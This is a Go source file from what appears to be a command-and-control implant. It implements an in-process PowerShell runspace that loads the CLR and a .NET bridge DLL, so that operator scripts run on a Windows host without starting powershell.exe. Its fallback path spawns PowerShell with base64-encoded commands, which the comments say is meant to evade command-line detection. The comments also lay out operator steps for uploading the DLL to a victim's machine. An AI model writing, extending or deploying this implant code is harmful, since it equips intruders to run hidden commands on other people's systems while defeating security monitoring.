//go:build windows

package main

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
)

// PowerShell runspace in-process.
//
// Primary path: load the CLR via dotnetExecute + a psbridge.dll shim that
// uses System.Management.Automation.Runspaces.RunspaceFactory to execute the
// script entirely within the current process — no powershell.exe created.
//
// Fallback path (when bridgePath is "" or file is missing): execPowerShell
// via encoded command, which spawns powershell.exe but encodes the command in
// base64 to avoid plain-text command-line detection.
//
// Operator workflow:
//   1. files upload <id> /local/psbridge.dll "C:\Temp\psbridge.dll"
//   2. psrunspace <id> --script "Get-Process | Select Name,Id" --bridge "C:\Temp\psbridge.dll"

const (
	psBridgeTypeName   = "PSBridge.Runner"
	psBridgeMethodName = "Execute"
)

// psRunspace executes psScript in-process if bridgePath (.NET shim DLL) is
// present; otherwise falls back to execPowerShell (spawns powershell.exe).
func psRunspace(psScript, bridgePath string) (string, error) {
	if bridgePath != "" {
		if _, err := os.Stat(bridgePath); err == nil {
			abs, _ := filepath.Abs(bridgePath)
			retCode, err := dotnetExecute(abs, psBridgeTypeName, psBridgeMethodName, psScript)
			if err != nil {
				// CLR path failed — fall through to execPowerShell.
				goto fallback
			}
			return fmt.Sprintf("[in-proc CLR] exit code %d", retCode), nil
		}
	}

fallback:
	ctx := context.Background()
	out, errOut, _ := execPowerShell(ctx, psScript)
	if errOut != "" {
		return out, fmt.Errorf("powershell: %s", errOut)
	}
	return out, nil
}
